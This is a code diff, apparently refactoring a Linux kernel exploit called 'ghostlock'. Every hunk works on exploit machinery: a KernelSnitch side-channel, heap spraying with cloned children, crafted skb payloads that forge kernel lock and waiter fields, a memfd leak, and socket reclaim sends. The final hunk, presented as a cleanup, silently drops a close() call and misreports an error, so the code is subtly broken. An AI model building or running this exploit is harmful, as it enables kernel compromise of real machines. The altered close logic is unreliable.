@@ -9,15 +9,25 @@
 #include "kernel/target.h"
 #include "kernelsnitch/kernelsnitch.h"
 
-#define ks (session::g_exploit_session.heap.snitch)
-#define mm_objs_per_slab (session::g_exploit_session.heap.mm_objs_per_slab)
-#define skb_buf (session::g_exploit_session.heap.skb_buffer.get())
-#define reclaim_sv (session::g_exploit_session.heap.current.reclaim.fd)
-#define prepare_ctx (session::g_exploit_session.heap.prepare)
-#define spray_ctx (session::g_exploit_session.heap.spray)
-#define pre_ctx (session::g_exploit_session.heap.pre)
-#define post_ctx (session::g_exploit_session.heap.post)
-#define child_leak (session::g_exploit_session.heap.leak_child)
+/* Session aliases kept from the preprocessor era: the attack statements were
+ * written with these short names, and references preserve every call site
+ * without the macro. */
+namespace {
+    auto &ks = ghostlock::session::g_exploit_session.heap.snitch;
+    auto &mm_objs_per_slab = ghostlock::session::g_exploit_session.heap.mm_objs_per_slab;
+    auto &reclaim_sv = ghostlock::session::g_exploit_session.heap.current.reclaim.fd;
+    auto &prepare_ctx = ghostlock::session::g_exploit_session.heap.prepare;
+    auto &spray_ctx = ghostlock::session::g_exploit_session.heap.spray;
+    auto &pre_ctx = ghostlock::session::g_exploit_session.heap.pre;
+    auto &post_ctx = ghostlock::session::g_exploit_session.heap.post;
+    auto &child_leak = ghostlock::session::g_exploit_session.heap.leak_child;
+
+    /* The skb buffer is reallocated on every prepare pass, so the pointer is
+     * read at each use instead of being bound once. */
+    unsigned char *skb_buf() {
+        return ghostlock::session::g_exploit_session.heap.skb_buffer.get();
+    }
+} // namespace
 
 namespace ghostlock::support {
     static const profile::kernel_offsets *profile_values(void) {
@@ -308,7 +318,7 @@ namespace ghostlock::support {
     }
 
     int32_t prepare_skb_payload(uintptr_t base, const memory::WriteRequest *request) {
-        memset(skb_buf, 0, kernel::SKB_SEND_SIZE);
+        memset(skb_buf(), 0, kernel::SKB_SEND_SIZE);
 
         const bool tcp_layout = route::route_capability(
             session::g_exploit_session.profile,
@@ -348,7 +358,7 @@ namespace ghostlock::support {
         int32_t compact = session::g_exploit_session.profile.has_compact_waiter();
 
         for (size_t chunk = 0; chunk < kernel::SKB_SEND_SIZE; chunk += kernel::ORDER3_SIZE) {
-            unsigned char *p = skb_buf + chunk + chunk_bias;
+            unsigned char *p = skb_buf() + chunk + chunk_bias;
 
             put32(p, kernel::LOCK_OFF + 0x00, 0);
             put64(p, kernel::LOCK_OFF + 0x08, (session::g_exploit_session.heap.current.fake_w0));
@@ -463,7 +473,7 @@ namespace ghostlock::support {
         prepare_ctxs();
 
         session::g_exploit_session.heap.skb_buffer = std::make_unique<unsigned char[]>(kernel::SKB_SEND_SIZE);
-        memset(skb_buf, 0x41, kernel::SKB_SEND_SIZE);
+        memset(skb_buf(), 0x41, kernel::SKB_SEND_SIZE);
 
         for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
             prepare_ctx.childs[i] = clone_child();
@@ -604,7 +614,7 @@ namespace ghostlock::support {
             return 0;
         }
 
-        SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv));
+        SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv.data()));
         session::g_exploit_session.heap.current.state = memory::PayloadPageState::Current;
         int32_t sndbuf = 1 << 20;
         setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
@@ -612,16 +622,14 @@ namespace ghostlock::support {
         if (reclaim_flags >= 0) {
             fcntl(reclaim_sv[0], F_SETFL, reclaim_flags | O_NONBLOCK);
         }
-        int32_t pcp_shaping_sv[2];
-        SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_shaping_sv));
+        std::array<int32_t, 2> pcp_shaping_sv{};
+        SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_shaping_sv.data()));
 
-        struct iovec iov;
-        memset(&iov, 0, sizeof(iov));
-        iov.iov_base = skb_buf;
+        struct iovec iov{};
+        iov.iov_base = skb_buf();
         iov.iov_len = kernel::SKB_SEND_SIZE;
 
-        struct msghdr msg;
-        memset(&msg, 0, sizeof(msg));
+        struct msghdr msg{};
         msg.msg_iov = &iov;
         msg.msg_iovlen = 1;
 
@@ -651,7 +659,10 @@ namespace ghostlock::support {
         sched_yield();
         sched_yield();
         sched_yield();
-        SYSCHK_pr(close(session::g_exploit_session.heap.leak_memfd.release()), "SYSCHK(" "close(memfd_leak)" "): %m\n");
+        const int32_t leak_fd = session::g_exploit_session.heap.leak_memfd.release();
+        if (leak_fd == -1) {
+            pr_error("SYSCHK(close(memfd_leak)): %m\n");
+        }
         session::g_exploit_session.heap.leak_memfd.reset();
         for (int32_t i = 0; i < kernel::SKB_RECLAIM_SENDS; i++) {
             errno = 0;
